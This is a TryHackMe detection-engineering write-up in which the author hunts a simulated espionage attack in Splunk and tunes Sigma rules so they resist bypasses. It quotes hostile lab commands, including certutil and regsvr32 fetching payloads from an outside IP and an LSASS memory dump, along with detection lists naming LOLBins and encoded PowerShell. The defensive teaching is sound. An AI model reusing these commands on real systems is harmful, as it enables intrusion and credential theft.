[![DetectMare](https://github.com/AnimSparrow/thm-writeups/raw/main/assets/banners/detectmare.svg)](/AnimSparrow/thm-writeups/blob/main/assets/banners/detectmare.svg)

[![](https://img.shields.io/badge/TRYHACKME-1a0633?style=for-the-badge&labelColor=FF2A6D)](https://tryhackme.com/room/detectmare)
[![](https://img.shields.io/badge/MEDIUM-1a0633?style=for-the-badge&labelColor=00F0FF)](#)
[![](https://img.shields.io/badge/DETECTION_ENGINEERING-1a0633?style=for-the-badge&labelColor=A479C4)](#)
[![](https://img.shields.io/badge/BLUE_TEAM-1a0633?style=for-the-badge&labelColor=A479C4)](#)

- **Room:** [DetectMare](https://tryhackme.com/room/detectmare)
- **Category:** Detection Engineering / Blue Team
- **Difficulty:** Medium
- **Key skills:** Detection-as-Code, Sigma rule tuning, SPL threat hunting, false-positive suppression, bypass-resistant detection logic

---

## Overview

> [!NOTE]
> **TL;DR** - A full **APT21** espionage kill chain ran against a government research institute and **not one alert fired**. You are handed a **Detection-as-Code** repo with five open pull requests - one per attack stage - each carrying a Sigma rule that is a starting point, not a solution. For every PR you hunt the real event in Splunk, tune the rule until **Environment Validation** hits `TP > 0 · FP 0` *and* the **Automated Red Team Test** survives every bypass attempt, then approve, merge, and read the flag the CI drops.
>
> The whole room is a lesson in one idea: a detection isn't "done" when it catches the sample attack - it's done when it **can't be trivially bypassed** and **doesn't drown analysts in the estate's normal noise**. Getting `Score 100%` on the answer key is the *easy* half.

The environment ships two interfaces: a **Splunk** instance (`index="dac_lab"`, set the time picker to **All time**) and a GitHub-style **DaC** site where the PRs, CI pipeline, and `threat-intel/` live. Every rule runs through four gates before it can merge: **Sigma Syntax → Converter (SPL) → Environment Validation → Automated Red Team Test**.

The attacker's path, from `threat-intel/incident_report.md`:

| # | Kill-chain phase | Technique | PR |
| --- | --- | --- | --- |
| 1 | Initial Access | T1566.001 Spearphishing Attachment | PR #1 |
| 2 | Execution | T1218 Signed Binary Proxy Execution | PR #2 |
| 3 | Credential Access | T1003.001 LSASS Memory | PR #3 |
| 4 | Lateral Movement | T1550.002 Pass the Hash | PR #4 |
| 5 | Exfiltration (staging) | T1560.001 Archive via Utility | PR #5 |

Foothold host: `RESEARCH-ENG14`. Compromised user: `m.okafor`. Targets: `FS-CLASSIFIED01` / `FS-CLASSIFIED02`.

The single most important reference in the whole room is `docs/environment-routines.md` - the estate's **known-benign baseline**. Every false positive you hit is a routine you failed to exclude; every bypass you fail is a benign attribute an attacker can forge.

---

## PR #1 - Spearphishing Attachment Spawns Suspicious Child Process (T1566.001)

The lure is an Office document that spawns a script host. The starting rule is worse than useless - it matches the *wrong* process entirely.

### ✦ Finding the malicious document

The child process that betrays the lure is `cmd.exe` spawned by `WINWORD.EXE`. Hunt the parent command line:

```spl
index="dac_lab" ParentImage="*\\WINWORD.EXE"
  (Image="*\\cmd.exe" OR Image="*\\mshta.exe" OR Image="*\\regsvr32.exe" OR Image="*\\powershell.exe")
| table _time, User, ParentCommandLine, Image, CommandLine
```

One hit stands out - `m.okafor` on `RESEARCH-ENG14`, the Word parent opening a downloaded `.docm`, immediately spawning `certutil` to pull a payload from `45.77.12.9`:

```
ParentCommandLine: "WINWORD.EXE" /n "C:\Users\m.okafor\Downloads\Hypersonic_Test_Schedule_2025.docm"
CommandLine:       cmd.exe /c certutil -urlcache -split -f http://45.77.12.9/u.dat %TEMP%\u.dat
```

The `.docm` name matches APT21's national-security-themed social engineering exactly.

**→ Doc opened by the infected user:** `Hypersonic_Test_Schedule_2025.docm`

### ✦ Bug 1 - the rule detects the benign helper, not the attack

```yaml
# broken
selection:
  ParentImage|endswith: '\WINWORD.EXE'
  Image|endswith: '\officetelemetryagent.exe'   # ❌ this is the benign telemetry helper
condition: selection
```

`officetelemetryagent.exe` is the estate's **signed Office telemetry agent** - explicitly benign in the baseline. The rule fires on the one thing it should ignore and ignores every LOLBin the lure actually uses. It matches the *sample* wrong and catches *zero* attacks.

The fix is a parent-set × child-set model: Office app **spawning** a script interpreter / LOLBin, minus the estate's known automations.

### ✦ Bug 2 - LOLBin allowlist too narrow (`3/5` bypass)

A fixed shortlist of child binaries is a coverage gap - the Red Team simply reaches for an interpreter that isn't on it (`msiexec`, `wmic`, `hh`, `schtasks`, `curl`, `msbuild`, `installutil`, …). Broaden the child set to the full common LOLBin roster.

### ✦ Bug 3 - the exclusion trusts a forgeable attribute (`4/5` bypass)

This is the heart of PR #1. The finance-automation exclusion went through three revisions, and only the last one is bypass-proof:

```yaml
# v1 - trusts the script NAME        ❌  attacker renames payload to monthend_report.bat
filter_finance:
  CommandLine|contains: 'monthend_report.bat'

# v2 - trusts the PATH string        ❌  still a CommandLine the attacker controls
filter_finance:
  CommandLine|contains: 'C:\ProgramData\ResearchIT\Automation\monthend_report.bat'

# v3 - trusts the PARENT relationship ✅  attacker can't spawn from the real Excel template
filter_finance:
  ParentImage|endswith: '\EXCEL.EXE'
  ParentCommandLine|contains: 'C:\Finance\MonthEnd_Template.xlsm'
```

The Red Team spelled the flaw out:

> *"a filter that only checks the script's name or path doesn't verify it was actually launched by the real finance automation."*

The real month-end job is **Excel opening its own internal template** `C:\Finance\MonthEnd_Template.xlsm` and spawning `cmd`. That `ParentCommandLine` is something the attacker's lure - which opens a downloaded `.docm` - can never reproduce. We confirmed the trusted template path in Splunk before anchoring to it:

```spl
index="dac_lab" sourcetype="sysmon:process_creation" ParentImage="*\\EXCEL.EXE" Image="*\\cmd.exe" CommandLine="*monthend_report.bat*"
| table _time, ParentCommandLine, CommandLine
```

### ✦ Final PR #1 rule

```yaml
title: Spearphishing Attachment Spawns Suspicious Child Process
logsource:
  product: windows
  category: process_creation
detection:
  selection_parent:
    ParentImage|endswith: ['\WINWORD.EXE','\EXCEL.EXE','\POWERPNT.EXE','\OUTLOOK.EXE','\MSACCESS.EXE']
  selection_child:
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\mshta.exe'
      - '\wscript.exe'
      - '\cscript.exe'
      - '\regsvr32.exe'
      - '\rundll32.exe'
      - '\certutil.exe'
      - '\bitsadmin.exe'
      - '\msiexec.exe'
      - '\wmic.exe'
      - '\hh.exe'
      - '\schtasks.exe'
      - '\curl.exe'
      - '\msbuild.exe'
      - '\installutil.exe'
      - '\regasm.exe'
      - '\regsvcs.exe'
      - '\forfiles.exe'
  filter_finance:
    ParentImage|endswith: '\EXCEL.EXE'
    ParentCommandLine|contains: 'C:\Finance\MonthEnd_Template.xlsm'
  condition: (selection_parent and selection_child) and not filter_finance
```

Result: `EV 100% · TP 1 · FP 0 · Red Team 5/5`.

> [!TIP]
> **Never exclude on an attribute the attacker controls.** A filename and its own command-line arguments are fully attacker-forgeable. Anchor exclusions to something they can't fake: a trusted parent process, a signed binary, a path they can't write to. The `name → path → parent` progression here is the single most transferable lesson in the room.

| Question | Answer |
| --- | --- |
| Doc file opened by the infected user | `Hypersonic_Test_Schedule_2025.docm` |
| PR #1 flag | `THM{OfFicE_***********}` |

---

## PR #2 - Signed Binary Proxy Execution of NetTraveler Dropper (T1218)

The loader is proxy-executed through signed Windows binaries (`regsvr32`, `rundll32`, `mshta`). This PR is a two-front fight: the starting rule matched **nothing** (a stale assumption about the payload), and once it matched, the Red Team attacked it from the opposite side (too narrow).

### ✦ The internal tool that causes false positives

`docs/environment-routines.md` names an internal deployment tool that *legitimately* invokes `rundll32`/`regsvr32` - the exact behaviour this rule hunts. It is the obvious FP source and must be excluded by parent + trusted path:

**→ Internal tool that may cause false positives in PR #2:** `researchdeploy.exe`

*(Its payloads live under `C:\ProgramData\ResearchIT\pkg\`. A second benign look-alike, the CAD license checker `LicenseCheck_CAD.dat`, also needs suppressing via the `LicenseCheck` string.)*

### ✦ Why the first attempts scored 0%

The initial rule keyed on a `.dat` loader extension - but the primary attack event has **no `.dat` at all**. Enumerating every proxy-binary call surfaced the real one:

```spl
index="dac_lab" sourcetype="sysmon:process_creation" (Image="*\\rundll32.exe" OR Image="*\\regsvr32.exe" OR Image="*\\mshta.exe")
| table _time, User, ParentImage, Image, CommandLine
```

```
09:06:20  t.nguyen  mshta.exe → regsvr32.exe
regsvr32.exe /s /n /u /i:http://45.77.12.9/s.sct C:\ProgramData\scrobj.dll
```

That is **squiblydoo** (T1218.010) - `regsvr32` pulling a remote `.sct` scriptlet over a URL. The distinguishing signal is `/i:http` + `.sct`, not a file extension.

### ✦ The two-variant trap

Keying only on the scriptlet made the Red Team bypass with the *loader* variant from the incident report (`rundll32 ...travel.dat,StartW` / `regsvr32 ...update.dat`). A robust rule must cover **both** proxy-exec styles - remote scriptlet **or** a loader staged in a user-writable path - while still excluding the benign `.dat` deployments.

> [!WARNING]
> Two symmetric failure modes in one PR. Too broad (`scrobj.dll`, bare `http://`) let a benign event in - `FP 1`. Too narrow (only `/i:http`+`.sct`) let three loader-staging bypasses through. The fix is **two explicit selection blocks**, each precise, OR'd together - not one loose catch-all.

### ✦ Final PR #2 rule

```yaml
title: Signed Binary Proxy Execution of NetTraveler Dropper
logsource:
  product: windows
  category: process_creation
detection:
  selection_proxybin:
    Image|endswith: ['\regsvr32.exe','\rundll32.exe','\mshta.exe']
  selection_remote_scriptlet:
    CommandLine|contains: ['/i:http','/i:https','.sct']
  selection_staged_loader:
    CommandLine|contains: ['\AppData\Roaming\','\AppData\Local\Temp\','\ProgramData\','\Users\Public\']
    CommandLine|contains: ['.dat','.tmp']
  filter_deploy:
    ParentImage|endswith: '\researchdeploy.exe'
  filter_deploy_path:
    CommandLine|contains: 'C:\ProgramData\ResearchIT\pkg\'
  filter_license:
    CommandLine|contains: 'LicenseCheck'
  condition: selection_proxybin and (selection_remote_scriptlet or selection_staged_loader) and not (filter_deploy or filter_deploy_path or filter_license)
```

Result: `EV 100% · TP 1 · FP 0 · Red Team 5/5`.

| Question | Answer |
| --- | --- |
| Internal tool that may cause false positives in PR #2 | `researchdeploy.exe` |
| PR #2 flag | `THM{sIgNeD_***********}` |

---

## PR #3 - LSASS Memory Access for Credential Theft (T1003.001)

Credentials are dumped straight from LSASS memory. The starting rule points at the benign crash handler instead of the dumper.

### ✦ Finding the dumping user

The dump lives only in `process_access` (Sysmon EID 10) - and the account is in the raw event's `SourceUser` field, not the display `User` (which shows `NOT_TRANSLATED`). That mismatch is why naive queries returned nothing.

```spl
index="dac_lab" sourcetype="sysmon:process_access" SourceImage="*\\rundll32.exe" GrantedAccess="0x1fffff"
| table _time, _raw
```

```
SourceImage:  C:\Windows\System32\rundll32.exe
TargetImage:  C:\Windows\System32\lsass.exe
GrantedAccess: 0x1fffff
CallTrace:    ...comsvcs.dll+1a3b0...
SourceUser:   RESEARCH\m.okafor
```

`rundll32` opening `lsass` with a full-access mask, call trace through `comsvcs.dll` - the classic `MiniDump` export - on the foothold host, 20 minutes before the pass-the-hash.

**→ Username that executed the LSASS dump:** `m.okafor`

### ✦ Bug - the rule detects WerFault, not the dumper

```yaml
# broken
selection:
  TargetImage|endswith: '\lsass.exe'
  SourceImage|endswith: '\WerFault.exe'   # ❌ benign crash handler
```

Fix: match **any** access to LSASS with a dump-grade mask, then subtract the named benign openers.

> [!WARNING]
> **Don't filter LSASS access on the access mask alone.** The benign EDR scanner (`edrscan.exe`) also uses `0x1fffff`, and EDR/PAM use `0x1438`. Exclude on the **source path** (`C:\Program Files\ResearchEDR\`, `ResearchPAM\`), and pin the WerFault exclusion to its crash mask `0x1410` only - so a renamed dumper masquerading as WerFault with a different mask still fires.

### ✦ Final PR #3 rule

```yaml
title: LSASS Memory Access for Credential Theft
logsource:
  product: windows
  category: process_access
detection:
  selection:
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess: ['0x1fffff','0x1010','0x1410','0x143a','0x1438']
  filter_edr:
    SourceImage|startswith: 'C:\Program Files\ResearchEDR\'
  filter_pam:
    SourceImage|startswith: 'C:\Program Files\ResearchPAM\'
  filter_werfault:
    SourceImage|endswith: '\WerFault.exe'
    GrantedAccess: '0x1410'
  condition: selection and not (filter_edr or filter_pam or filter_werfault)
```

Result: `EV 100% · TP 1 · FP 0 · Red Team 4/4`.

| Question | Answer |
| --- | --- |
| Username that executed the LSASS dump | `m.okafor` |
| PR #3 flag | `THM{DuMpInG_***********}` |

---

## PR #4 - Pass the Hash Lateral Movement to Classified Host (T1550.002)

The stolen NTLM hash is replayed onto the classified file servers. The starting rule keys on the wrong logon type entirely, and the answer key expects **two** events, not one.

### ✦ Finding the pass-the-hash timestamp

PtH shows as EID 4624, **LogonType 3**, `NTLM`, **KeyLength 0**. Eight events carry that fingerprint - two benign sources must be filtered: the failover-cluster account `svc_cluster` (FS-CLASSIFIED01↔02) and the legacy NTLM host `MES-LEGACY01` (`svc_mes`). One event remains:

```
3/11/2025 10:40:00.000 AM  m.okafor  RESEARCH-PC44 → FS-CLASSIFIED01  NTLM  KeyLength 0
```

**→ Pass-the-hash authentication time:** `03/11/2025 10:40:00.000 AM`

*(Format is the timestamp from the first line of the raw event, `MM/DD/YYYY HH:MM:SS.mmm AM/PM`.)*

### ✦ Bug 1 - wrong logon type

```yaml
# broken
selection:
  EventID: 4624
  LogonType: 10        # ❌ RemoteInteractive (RDP), not network PtH
```

Pass-the-hash is a **network logon - LogonType 3**. `10` never matches. Fix the type, add the `NTLM` + `KeyLength 0` fingerprint, and exclude the two baseline NTLM sources.

### ✦ Bug 2 - the technique has a second half (`Score 50%`)

With the logon fixed, EV still scored 50% (`TP 1`). The report is explicit: the operator *"installed a remote service to execute the payload."* That is **EID 7045**, arriving on `FS-CLASSIFIED01` three minutes after the logon:

```spl
index="dac_lab" sourcetype="wineventlog:security" EventCode=7045 | table _time, ComputerName, _raw
```

```
10:43:00  FS-CLASSIFIED01
Service Name:      WinHelpSvc
Service File Name: C:\ProgramData\Intel\nt.dat
```

The rule has to catch **both** halves: the PtH logon (4624) **and** the malicious service install (7045).

### ✦ Bug 3 - service matching too narrow (`2/3` bypass)

Pinning 7045 to `ServiceFileName contains \ProgramData\` caught `nt.dat` but missed a Red Team variant whose `ServiceFileName` runs `cmd.exe` piping into **encoded PowerShell**. The fix widens the service selection to user-writable paths **and** LOLBin/encoded-command signatures - while excluding the legit `PatchDeployAgent` (which benignly runs `powershell -File C:\Program Files\ResearchIT\Patch\apply.ps1`) by its trusted path.

### ✦ Final PR #4 rule

```yaml
title: Pass the Hash Lateral Movement to Classified Host
logsource:
  product: windows
  service: security
detection:
  selection_pth:
    EventID: 4624
    LogonType: 3
    AuthenticationPackageName: 'NTLM'
    KeyLength: 0
  selection_service_path:
    EventID: 7045
    ServiceFileName|contains: ['\ProgramData\','\Users\','\AppData\','\Temp\','\PerfLogs\']
  selection_service_lolbin:
    EventID: 7045
    ServiceFileName|contains: ['cmd.exe','powershell','pwsh','rundll32','regsvr32','mshta','wscript','cscript','-enc','-EncodedCommand','FromBase64String','DownloadString','IEX','Invoke-Expression']
  filter_legacy:
    WorkstationName: 'MES-LEGACY01'
  filter_cluster:
    TargetUserName: 'svc_cluster'
  filter_patch:
    ServiceFileName|contains: 'C:\Program Files\ResearchIT\Patch\'
  condition: (selection_pth or selection_service_path or selection_service_lolbin) and not (filter_legacy or filter_cluster or filter_patch)
```

Result: `EV 100% · TP 2 · FP 0 · Red Team 5/5`.

> [!TIP]
> **Detect the whole technique, not one artefact.** PtH is logon *plus* payload execution. Scoring 50% is the pipeline telling you the answer key sees a second event you don't. And exclude legit service installs by **trusted path**, not by "it mentions PowerShell" - `PatchDeployAgent` proves benign automation can look identical to the attack at the keyword level.

| Question | Answer |
| --- | --- |
| Pass-the-hash authentication time | `03/11/2025 10:40:00.000 AM` |
| PR #4 flag | `THM{PaSs_***********}` |

---

## PR #5 - Weapons Program Data Staged and Archived for Exfiltration (T1560.001)

Design files are compressed into password-protected archives before exfil. The starting rule keys on the archiver's **filename** - trivially bypassed by a rename.

### ✦ Finding the backup-masquerade folder

The estate's nightly backup (`researchbackup.exe`, running as `svc_backup`) archives the classified shares into a fixed destination every night. A malicious binary dropped into that destination blends into the routine:

```
svc_backup  researchbackup.exe → 7z a -mx9 D:\Backups\nightly\designs_0.7z \\fs-classified01\designs\*.sldprt
```

**→ Folder to place a malicious binary to look like a legitimate backup routine:** `D:\Backups\nightly`

*(This is the destination the nightly job writes to - the folder the routine "owns" - which is what makes a planted binary there read as backup activity.)*

### ✦ Bug - detection keyed to the archiver's name (`2/3` bypass)

```yaml
# broken
selection:
  Image|endswith: '\7z.exe'   # ❌ rename 7z.exe → svchost.exe and the rule is blind
```

The Red Team said it directly:

> *"a renamed archiver binary (disguised as a system process name) using 7z-style syntax … your archiver detection is likely keyed to a real archiver filename instead of the command-line behavior."*

Fix: drop the filename dependency entirely and match on **behaviour** - archive syntax (`a`, `-mx`, `-hp`, `Compress-Archive`, archive extensions) **plus** classified intent (`.sldprt`, `.catpart`, `.dwg`, `\designs\`, `\weapons\`) - then exclude the nightly backup and SOLIDWORKS autosave.

### ✦ Final PR #5 rule

```yaml
title: Weapons Program Data Staged and Archived for Exfiltration
logsource:
  product: windows
  category: process_creation
detection:
  selection_intent:
    CommandLine|contains: ['.sldprt','.catpart','.dwg','\designs\','\weapons\']
  selection_archive_syntax:
    CommandLine|contains: [' a ','-mx','-hp','-p','Compress-Archive','.7z','.rar','.zip']
  filter_backup_tool:
    ParentImage|endswith: '\researchbackup.exe'
  filter_backup_dest:
    CommandLine|contains: 'D:\Backups\nightly'
  filter_autosave:
    CommandLine|contains: 'SW_AutoBackup'
  condition: (selection_intent and selection_archive_syntax) and not (filter_backup_tool or filter_backup_dest or filter_autosave)
```

The attacker's `rar a -hpP@ssw0rd! ... \\fs-classified01\designs\*.sldprt` from `AppData\Local\Temp\rar.exe` fires on syntax + intent regardless of the binary name; users zipping `*.jpg` from their Pictures never match intent, so `FP 0`.

Result: `EV 100% · Red Team 5/5`.

> [!WARNING]
> **Detect behaviour, not binaries.** Any rule keyed to a specific executable name dies to `copy 7z.exe svchost.exe`. Match the *action* (archive syntax against classified extensions) in the command line - that's the thing the attacker can't rename away.

| Question | Answer |
| --- | --- |
| Folder to stage a malicious binary as a backup routine | `D:\Backups\nightly` |
| PR #5 flag | `THM{ArChIvE_***********}` |

---

## Loot

| | |
| --- | --- |
| 🩸 PR #1 - Spearphishing | `THM{OfFicE_***********}` |
| ⚙️ PR #2 - Signed Binary Proxy Exec | `THM{sIgNeD_***********}` |
| 🔑 PR #3 - LSASS Dump | `THM{DuMpInG_***********}` |
| 🎭 PR #4 - Pass the Hash | `THM{PaSs_***********}` |
| 👑 PR #5 - Archive & Exfil | `THM{ArChIvE_***********}` |

> Flags masked on purpose - solve the room, every value is one merged PR away.

---

## Lessons learned

- **Never exclude on an attribute the attacker controls.** Filenames and command-line arguments are forgeable; trusted parents, signed paths, and write-protected locations are not. PR #1's `name → path → parent` filter evolution is the whole discipline in miniature.
- **`Score 100%` on the answer key is the easy half.** Environment Validation proves the rule catches the *sample* attack. The Automated Red Team Test is where detection engineering actually happens - narrow allowlists, renameable binaries, and forgeable exclusions all pass EV and fail bypass.
- **Detect the technique's behaviour, not one artefact.** Match archive *syntax* not `7z.exe`; match proxy-exec *patterns* not one payload extension; catch *both* halves of pass-the-hash. Every bypass in this room came from a rule that pattern-matched a single observable instead of the technique.
- **The baseline document is the detection.** Every false positive was a `docs/environment-routines.md` routine left unexcluded; every clean `FP 0` came from reading it first. Knowing the estate's normal is not optional context - it *is* the tuning work.

---

[![More writeups on GitHub](https://github.com/AnimSparrow/thm-writeups/raw/main/assets/more_writeups.svg)](https://github.com/AnimSparrow/thm-writeups)
